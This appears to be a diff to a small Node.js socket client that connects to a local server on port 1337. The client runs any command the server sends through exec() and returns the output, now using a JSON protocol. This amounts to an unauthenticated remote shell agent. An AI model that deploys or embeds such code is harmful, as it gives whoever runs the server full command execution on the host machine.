@@ -12,23 +12,28 @@ if (typeof String.prototype.contains === 'undefined') { String.prototype.contain
 /** 
  * Logic 
  */
-var protocol = function (cmd) {
-	if(cmd.contains("cmd#")) {
-		var arg = cmd.split("#")[1]; // second argument is the command it self.
-
-		const child = exec(arg,
+var protocol = function (d) {
+	var command = JSON.parse(decoder.write(d));
+	console.log(command);
+	
+	// execute command
+	if(command.name == "execute") {
+		console.log('enviando: '+command.name);
+		const child = exec(command.arg,
 		  (error, stdout, stderr) => {
-		  	client.write("reply#"+stdout);
+		        client.write(JSON.stringify({"name":"reply", "arg":stdout}));
 		});
 	}
+
+	// status command
+	// TODO
 }
 
 /**
  * Client ops
  */
 client.on('data', function(data) {
-    var cmd = decoder.write(data);
-    protocol(cmd);
+  	protocol(data);
 });
 
 client.on('close', function() {
@@ -37,5 +42,5 @@ client.on('close', function() {
 
 client.connect(1337, '127.0.0.1', function() {
 	console.log('Connected');
-	client.write('reply#ack');
+	client.write(JSON.stringify({"name":"ack", "arg":""}));
 });
